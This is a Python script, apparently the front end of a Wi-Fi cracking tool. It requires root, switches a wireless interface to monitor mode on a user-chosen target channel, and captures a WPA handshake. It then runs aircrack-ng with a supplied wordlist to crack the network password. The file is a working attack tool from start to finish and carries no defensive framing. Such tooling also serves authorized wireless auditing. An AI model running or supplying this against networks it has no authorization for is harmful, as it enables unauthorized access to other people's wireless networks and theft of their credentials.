import os
import subprocess
import sys

from colored import Fore, Style

import packet_capture as pc


def main() -> None:
    if os.geteuid() != 0:
        print("[-] Error: This script must be run as a root (use sudo).")
        sys.exit(1)

    CHANNEL = input(f"{Fore.magenta}[*] Please enter target channel: {Style.reset}")
    IFACE = input(
        f"{Fore.magenta}[*] Please enter name of your wireless interface:"
        f" {Style.reset}"
    )
    OUTPUT_PREFIX = input(
        f"{Fore.magenta}[*] Please enter name of output prefix for files:"
        f" {Style.reset}"
    )

    pc.configure_monitor_mode(IFACE, CHANNEL)

    success, capture_file = pc.sniffing(IFACE, CHANNEL, OUTPUT_PREFIX)

    if success and os.path.exists(capture_file):
        print(f"\n{Fore.green}[+] Handshake file ready: {capture_file}{Style.reset}")
        confirm = input(
            f"{Fore.yellow}[?] Valid handshake detected! Start aircrack-ng crack"
            f" sequence now? (y/n): {Style.reset}"
        )

        if confirm.lower().strip() == "y":
            wordlist = input(
                f"{Fore.magenta}[*] Enter absolute path to your wordlist dictionary"
                f" file: {Style.reset}"
            )
            if not os.path.exists(wordlist):
                print(f"{Fore.red}[-] Error: Wordlist path not found.{Style.reset}")
                return

            print(f"\n{Fore.cyan}[*] Launching aircrack-ng session...{Style.reset}")
            try:
                subprocess.run(["aircrack-ng", "-w", wordlist, capture_file])
            except FileNotFoundError:
                print(
                    f"{Fore.red}[-] Error: aircrack-ng executable not found on this"
                    f" system.{Style.reset}"
                )
        else:
            print(f"{Fore.cyan}[*] Skipping automated cracking step.{Style.reset}")
    else:
        print(
            f"\n{Fore.red}[-] Capture terminated without securing a handshake"
            f" profile.{Style.reset}"
        )


if __name__ == "__main__":
    main()
